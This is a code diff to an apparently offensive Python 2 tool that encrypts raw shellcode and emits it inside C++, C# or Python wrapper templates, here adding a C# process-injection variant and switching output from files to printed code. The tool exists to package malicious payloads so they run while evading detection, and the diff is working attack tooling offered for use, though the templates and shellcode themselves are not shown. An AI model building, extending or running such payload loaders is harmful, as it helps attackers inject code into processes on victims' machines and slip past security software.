@@ -16,13 +16,8 @@ import os
 templates = {
 	'cpp': './templates/encryptedShellcodeWrapper.cpp',
 	'csharp': './templates/encryptedShellcodeWrapper.cs',
+	'csharp_inject': './templates/encryptedShellcodeWrapper_inject.cs',
 	'python': './templates/encryptedShellcodeWrapper.py'
-}
-
-resultFiles = {
-	'cpp': './result/encryptedShellcodeWrapper.cpp',
-	'csharp': './result/encryptedShellcodeWrapper.cs',
-	'python': './result/encryptedShellcodeWrapper.py'
 }
 
 #======================================================================================================
@@ -84,31 +79,29 @@ def formatCPP(data, key, cipherType):
 	result = convertFromTemplate({'shellcode': shellcode, 'key': key, 'cipherType': cipherType}, templates['cpp'])
 
 	if result != None:
-		try:
-			fileName = os.path.splitext(resultFiles['cpp'])[0] + "_" + cipherType + os.path.splitext(resultFiles['cpp'])[1]
-			with open(fileName,"w+") as f:
-				f.write(result)
-				f.close()
-				print color("[+] C++ code file saved in [{}]".format(fileName))
-		except IOError:
-			print color("[!] Could not write C++ code  [{}]".format(fileName))
+		print result
 
 #------------------------------------------------------------------------
 # data as a bytearray
 def formatCSharp(data, key, cipherType):
-	shellcode = '0x'
-	shellcode += ',0x'.join(format(ord(b),'02x') for b in data)
+	shellcode = ''
+  # Ordinal notation takes up less space when encoding this 
+	shellcode += ','.join(format(ord(b)) for b in data)
 	result = convertFromTemplate({'shellcode': shellcode, 'key': key, 'cipherType': cipherType}, templates['csharp'])
 
 	if result != None:
-		try:
-			fileName = os.path.splitext(resultFiles['csharp'])[0] + "_" + cipherType + os.path.splitext(resultFiles['csharp'])[1]
-			with open(fileName,"w+") as f:
-				f.write(result)
-				f.close()
-				print color("[+] C# code file saved in [{}]".format(fileName))
-		except IOError:
-			print color("[!] Could not write C# code  [{}]".format(fileName))
+		print result
+
+#------------------------------------------------------------------------
+# data as a bytearray
+def formatCSharpInject(data, key, cipherType):
+	shellcode = ''
+  # Ordinal notation takes up less space when encoding this 
+	shellcode += ','.join(format(ord(b)) for b in data)
+	result = convertFromTemplate({'shellcode': shellcode, 'key': key, 'cipherType': cipherType}, templates['csharp_inject'])
+
+	if result != None:
+		print result
 
 #------------------------------------------------------------------------
 # data as a bytearray
@@ -118,14 +111,7 @@ def formatPy(data, key, cipherType):
 	result = convertFromTemplate({'shellcode': shellcode, 'key': key, 'cipherType': cipherType}, templates['python'])
 
 	if result != None:
-		try:
-			fileName = os.path.splitext(resultFiles['python'])[0] + "_" + cipherType + os.path.splitext(resultFiles['python'])[1]
-			with open(fileName,"w+") as f:
-				f.write(result)
-				f.close()
-				print color("[+] Python code file saved in [{}]".format(fileName))
-		except IOError:
-			print color("[!] Could not write Python code  [{}]".format(fileName))
+			print result
 
 #------------------------------------------------------------------------
 # data as a bytearray
@@ -185,14 +171,9 @@ if __name__ == '__main__':
 	parser.add_argument("-b64", "--base64", help="Display transformed shellcode as base64 encoded string", action="store_true")
 	parser.add_argument("-cpp", "--cplusplus", help="Generates C++ file code", action="store_true")
 	parser.add_argument("-cs", "--csharp", help="Generates C# file code", action="store_true")
+	parser.add_argument("-csi", "--csharpinject", help="Generates C# file code (Process Injection)", action="store_true")
 	parser.add_argument("-py", "--python", help="Generates Python file code", action="store_true")
 	args = parser.parse_args() 
-
-	#------------------------------------------------------------------------------
-	# Check that required directories and path are available, if not create them
-	if not os.path.isdir("./result"):
-		os.makedirs("./result")
-		print color("[+] Creating [./result] directory for resulting code files")
 
 	#------------------------------------------------------------------------
 	# Open shellcode file and read all bytes from it
@@ -228,7 +209,6 @@ if __name__ == '__main__':
 
 	#------------------------------------------------------------------------
 	# Display interim results
-	print "\n==================================== RESULT ====================================\n"
 	print color("[*] Encrypted shellcode size: [{}] bytes".format(len(transformedShellcode)))
 	#------------------------------------------------------------------------
 	# Display formated output
@@ -238,17 +218,21 @@ if __name__ == '__main__':
 		print ""
 	
 	if args.cplusplus:
-		print color("[*] Generating C++ code file")
+		print color("[*] Generating C++ code")
 		formatCPP(transformedShellcode, masterKey, cipherType)
 		print ""
 		
-
 	if args.csharp:
-		print color("[*] Generating C# code file")
+		print color("[*] Generating C# code")
 		formatCSharp(transformedShellcode, masterKey, cipherType)
 		print ""
 
+	if args.csharpinject:
+		print color("[*] Generating C# code (process injection)")
+		formatCSharpInject(transformedShellcode, masterKey, cipherType)
+		print ""
+
 	if args.python:
-		print color("[*] Generating Python code file")
+		print color("[*] Generating Python code")
 		formatPy(transformedShellcode, masterKey, cipherType)
 		print ""
